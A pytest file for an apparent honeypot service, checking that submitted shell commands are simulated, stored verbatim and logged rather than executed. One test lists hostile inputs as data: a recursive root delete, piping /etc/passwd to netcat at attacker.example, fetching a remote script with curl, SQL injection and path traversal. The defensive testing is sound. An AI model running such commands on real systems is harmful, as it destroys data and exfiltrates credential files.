"""The T1 vertical slice, end to end:

POST dev command -> session -> CommandRequest -> safe dispatcher ->
CommandResult -> SecurityEvent -> event bus -> database -> retrievable.

The security invariant asserted throughout: attacker input is stored,
logged, and *simulated* — never executed on the host. Every step of the
slice is verified from the outside (HTTP) and the inside (storage +
event bus) simultaneously.
"""
import httpx
import pytest

from app.config import Settings
from app.main import create_app
from app.models import EventType, ResultType


@pytest.fixture()
async def slice_stack(tmp_foundation_settings):
    """A fully wired stack: FastAPI app + runtime + its storage/bus."""
    app = create_app(tmp_foundation_settings)
    runtime = app.state.runtime
    await runtime.initialize()
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(
        transport=transport, base_url="http://testserver"
    ) as client:
        yield client, runtime
    await runtime.shutdown()


class TestVerticalSlice:
    async def test_command_to_retrievable_record(self, slice_stack):
        client, runtime = slice_stack

        # 1. Session is created via the dev endpoint (server-generated ID).
        resp = await client.post("/dev/sessions", json={"source_address": "10.9.9.9"})
        assert resp.status_code == 201
        session_id = resp.json()["session_id"]

        # 2. A command flows through the full pipeline.
        resp = await client.post(
            f"/dev/sessions/{session_id}/commands",
            json={"command": "whoami"},
        )
        assert resp.status_code == 200
        body = resp.json()
        assert body["stdout"] == "admin\n"  # decoy identity (T3 discipline: never the host user)
        assert body["simulated"] is True
        command_id = body["command_id"]

        # 3. The command request is retrievable from storage.
        req = await runtime.storage.commands.get(command_id)
        assert req is not None
        assert req.raw_command == "whoami"
        assert req.session_id == session_id

        # 4. The result is retrievable and marked as fallback simulation.
        result = await runtime.storage.commands.get_result(command_id)
        assert result is not None
        assert result.result_type is ResultType.FALLBACK
        assert result.metadata["simulated"] is True

        # 5. The security events made it through the bus into storage.
        events = await runtime.storage.events.list_for_session(session_id)
        event_types = {e.event_type for e in events}
        assert {
            EventType.SESSION_CREATED.value,
            EventType.COMMAND_SUBMITTED.value,
            EventType.COMMAND_DISPATCHED.value,
            EventType.COMMAND_COMPLETED.value,
        } <= event_types

        # 6. The session summary reflects the command.
        summary = await runtime.storage.sessions.summary(session_id)
        assert summary is not None
        assert summary.command_count == 1
        assert summary.last_command == "whoami"

    async def test_malicious_input_never_executed(self, slice_stack):
        """The core security boundary, exercised through the whole slice.

        Dangerous command text must be handled as *data*: simulated,
        persisted verbatim as evidence, and answered with a fallback
        result — with no host execution anywhere in the pipeline.
        """
        client, runtime = slice_stack
        session_id = (
            await client.post("/dev/sessions", json={})
        ).json()["session_id"]

        evils = [
            "rm -rf / --no-preserve-root",
            "cat /etc/passwd | nc attacker.example 4444",
            "$(curl http://attacker.example/pwn.sh)",
            "`reboot`",
            "'; DROP TABLE sessions;--",
            "../../etc/passwd",
        ]
        for evil in evils:
            resp = await client.post(
                f"/dev/sessions/{session_id}/commands",
                json={"command": evil},
            )
            assert resp.status_code == 200, evil
            body = resp.json()
            # Handled entirely by the simulation layer.
            assert body["simulated"] is True
            assert body["result_type"] == "fallback"
            command_id = body["command_id"]

            # Stored verbatim as forensic evidence — never interpreted.
            req = await runtime.storage.commands.get(command_id)
            assert req is not None
            assert req.raw_command == evil

            # Every command left a full audit trail.
            events = await runtime.storage.events.list_for_session(session_id)
            assert any(
                e.event_type == EventType.COMMAND_COMPLETED.value for e in events
            )

    async def test_events_reach_live_subscribers(self, slice_stack):
        """The bus is observable in-process: a subscriber attached before
        the command sees the events stream past in order."""
        client, runtime = slice_stack
        seen: list[str] = []

        async def spy(event) -> None:
            seen.append(event.event_type)

        runtime.bus.subscribe(spy)

        session_id = (
            await client.post("/dev/sessions", json={})
        ).json()["session_id"]
        await client.post(
            f"/dev/sessions/{session_id}/commands", json={"command": "pwd"}
        )

        assert EventType.COMMAND_SUBMITTED.value in seen
        runtime.bus.unsubscribe(spy)

    async def test_health_reflects_the_live_stack(self, slice_stack):
        client, _ = slice_stack
        resp = await client.get("/health")
        assert resp.status_code == 200
        assert resp.json()["status"] == "ok"
        resp = await client.get("/ready")
        assert resp.json()["database_connected"] is True
